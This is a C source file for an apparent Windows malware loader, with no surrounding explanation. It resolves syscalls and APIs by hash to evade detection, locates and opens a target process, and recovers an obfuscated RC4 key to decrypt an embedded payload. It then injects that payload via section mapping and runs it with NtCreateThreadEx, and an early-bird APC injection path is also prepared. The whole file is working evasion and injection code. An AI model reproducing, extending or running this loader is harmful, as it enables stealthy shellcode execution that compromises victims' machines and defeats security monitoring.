#include "loader_config.h"
#include <Windows.h>
#include "Structs.h"
#include "Common.h"
#include "Debug.h"

VX_TABLE    g_Sys = { 0 };
API_HASHING g_Api = { 0 };

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//

BOOL InitializeSyscalls() {

	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return FALSE;

	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	g_Sys.NtCreateSection.uHash          = NtCreateSection_JOAA;
	g_Sys.NtMapViewOfSection.uHash       = NtMapViewOfSection_JOAA;
	g_Sys.NtUnmapViewOfSection.uHash     = NtUnmapViewOfSection_JOAA;
	g_Sys.NtClose.uHash                  = NtClose_JOAA;
	g_Sys.NtCreateThreadEx.uHash         = NtCreateThreadEx_JOAA;
	g_Sys.NtWaitForSingleObject.uHash    = NtWaitForSingleObject_JOAA;
	g_Sys.NtQuerySystemInformation.uHash = NtQuerySystemInformation_JOAA;
	g_Sys.NtDelayExecution.uHash         = NtDelayExecution_JOAA;

	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtCreateSection))          return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtMapViewOfSection))       return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtUnmapViewOfSection))     return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtClose))                  return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtCreateThreadEx))         return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtWaitForSingleObject))    return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtQuerySystemInformation)) return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtDelayExecution))         return FALSE;

	// User32.dll
	g_Api.pCallNextHookEx    = (fnCallNextHookEx)   GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), CallNextHookEx_JOAA);
	g_Api.pDefWindowProcW    = (fnDefWindowProcW)   GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), DefWindowProcW_JOAA);
	g_Api.pGetMessageW       = (fnGetMessageW)       GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), GetMessageW_JOAA);
	g_Api.pSetWindowsHookExW = (fnSetWindowsHookExW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), SetWindowsHookExW_JOAA);
	g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), UnhookWindowsHookEx_JOAA);

	if (!g_Api.pCallNextHookEx || !g_Api.pDefWindowProcW || !g_Api.pGetMessageW ||
	    !g_Api.pSetWindowsHookExW || !g_Api.pUnhookWindowsHookEx)
		return FALSE;

	// Kernel32.dll
	g_Api.pGetModuleFileNameW       = (fnGetModuleFileNameW)      GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetModuleFileNameW_JOAA);
	g_Api.pCloseHandle              = (fnCloseHandle)             GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CloseHandle_JOAA);
	g_Api.pCreateFileW              = (fnCreateFileW)             GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CreateFileW_JOAA);
	g_Api.pGetTickCount64           = (fnGetTickCount64)          GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);
	g_Api.pOpenProcess              = (fnOpenProcess)             GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), OpenProcess_JOAA);
	g_Api.pSetFileInformationByHandle = (fnSetFileInformationByHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), SetFileInformationByHandle_JOAA);

	if (!g_Api.pGetModuleFileNameW || !g_Api.pCloseHandle || !g_Api.pCreateFileW ||
	    !g_Api.pGetTickCount64 || !g_Api.pOpenProcess || !g_Api.pSetFileInformationByHandle)
		return FALSE;

#ifdef INJECT_EARLY_BIRD
	g_Api.pVirtualAllocEx       = (fnVirtualAllocEx)      GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), VirtualAllocEx_JOAA);
	g_Api.pVirtualProtectEx     = (fnVirtualProtectEx)    GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), VirtualProtectEx_JOAA);
	g_Api.pWriteProcessMemory   = (fnWriteProcessMemory)  GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), WriteProcessMemory_JOAA);
	g_Api.pQueueUserAPC         = (fnQueueUserAPC)        GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), QueueUserAPC_JOAA);
	g_Api.pCreateProcessW       = (fnCreateProcessW)      GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CreateProcessW_JOAA);
	g_Api.pDebugActiveProcessStop = (fnDebugActiveProcessStop)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), DebugActiveProcessStop_JOAA);

	if (!g_Api.pVirtualAllocEx || !g_Api.pVirtualProtectEx || !g_Api.pWriteProcessMemory ||
	    !g_Api.pQueueUserAPC || !g_Api.pCreateProcessW || !g_Api.pDebugActiveProcessStop)
		return FALSE;
#endif

	return TRUE;
}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//

BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess) {

	ULONG                    uReturnLen1 = 0, uReturnLen2 = 0;
	PSYSTEM_PROCESS_INFORMATION SystemProcInfo = NULL;
	PVOID                    pValueToFree = NULL;
	NTSTATUS                 STATUS = 0;

	// First call: get required buffer size (will fail with STATUS_INFO_LENGTH_MISMATCH)
	SYSCALL(g_Sys.NtQuerySystemInformation, SystemProcessInformation, NULL, NULL, &uReturnLen1);

	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (!SystemProcInfo)
		return FALSE;

	pValueToFree = SystemProcInfo;

	STATUS = SYSCALL(g_Sys.NtQuerySystemInformation, SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0) {
#ifdef DEBUG
		PRINTA("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	while (TRUE) {
		if (SystemProcInfo->ImageName.Length && HASHW(SystemProcInfo->ImageName.Buffer) == HASHW(szProcName)) {
			*pdwPid    = (DWORD)(ULONG_PTR)SystemProcInfo->UniqueProcessId;
			*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(ULONG_PTR)SystemProcInfo->UniqueProcessId);
			break;
		}
		if (!SystemProcInfo->NextEntryOffset)
			break;
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}

	HeapFree(GetProcessHeap(), 0, pValueToFree);

	if (*pdwPid == 0 || *phProcess == NULL)
		return FALSE;

	return TRUE;
}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//

typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	NTSTATUS  STATUS          = NULL;
	BYTE      RealKey[KEY_SIZE] = { 0 };
	int       b               = 0;

	// Brute-force the single-byte XOR+offset to recover the real key
	while (1) {
		if (((pRc4Key[0] ^ b) - 0) == HINT_BYTE)
			break;
		b++;
	}
#ifdef DEBUG
	PRINTA("[i] Calculated 'b' to be : 0x%0.2X \n", b);
#endif

	for (int i = 0; i < KEY_SIZE; i++)
		RealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);

	USTRING Key = { .Buffer = RealKey,       .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize };
	USTRING Img = { .Buffer = pPayloadData,  .Length = sPayloadSize, .MaximumLength = sPayloadSize };

	// Cryptsp hosts SystemFunction032 — Advapi32 merely forwards it
	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryA("Cryptsp"), SystemFunction032_JOAA);

	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
#ifdef DEBUG
		PRINTA("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
#endif
		return FALSE;
	}

	return TRUE;
}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//

BOOL Rc4DecryptPayload(IN PVOID pPayload, IN SIZE_T sSize) {
	return Rc4EncryptionViSystemFunc032(EncRc4Key, (PBYTE)pPayload, KEY_SIZE, (DWORD)sSize);
}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//

BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal) {

	HANDLE       hSection       = NULL;
	HANDLE       hThread        = NULL;
	PVOID        pLocalAddress  = NULL;
	PVOID        pRemoteAddress = NULL;
	PVOID        pExecAddress   = NULL;
	NTSTATUS     STATUS         = 0;
	SIZE_T       sViewSize      = 0;
	LARGE_INTEGER MaximumSize   = { .HighPart = 0, .LowPart = (ULONG)sPayloadSize };
	DWORD        dwLocalFlag    = PAGE_READWRITE;

	if ((STATUS = SYSCALL(g_Sys.NtCreateSection, &hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	if (bLocal)
		dwLocalFlag = PAGE_EXECUTE_READWRITE;

	if ((STATUS = SYSCALL(g_Sys.NtMapViewOfSection, hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, dwLocalFlag)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pLocalAddress, sViewSize);
#endif

	_memcpy(pLocalAddress, pPayload, sPayloadSize);
#ifdef DEBUG
	PRINTA("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pLocalAddress);
#endif

	if (!bLocal) {
		if ((STATUS = SYSCALL(g_Sys.NtMapViewOfSection, hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
#ifdef DEBUG
			PRINTA("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", STATUS);
#endif
			return FALSE;
		}
#ifdef DEBUG
		PRINTA("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pRemoteAddress, sViewSize);
#endif
	}

	pExecAddress = bLocal ? pLocalAddress : pRemoteAddress;

	if (!Rc4EncryptionViSystemFunc032(EncRc4Key, pLocalAddress, KEY_SIZE, (DWORD)sPayloadSize))
		return FALSE;

#ifdef DEBUG
	PRINTA("\t[i] Running Thread Of Entry 0x%p ... ", pExecAddress);
#endif
	if ((STATUS = SYSCALL(g_Sys.NtCreateThreadEx, &hThread, THREAD_ALL_ACCESS, NULL, hProcess, pExecAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] DONE \n");
	PRINTA("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));
#endif

	if ((STATUS = SYSCALL(g_Sys.NtWaitForSingleObject, hThread, FALSE, NULL)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	if ((STATUS = SYSCALL(g_Sys.NtUnmapViewOfSection, (HANDLE)-1, pLocalAddress)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	if ((STATUS = SYSCALL(g_Sys.NtClose, hSection)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	return TRUE;
}
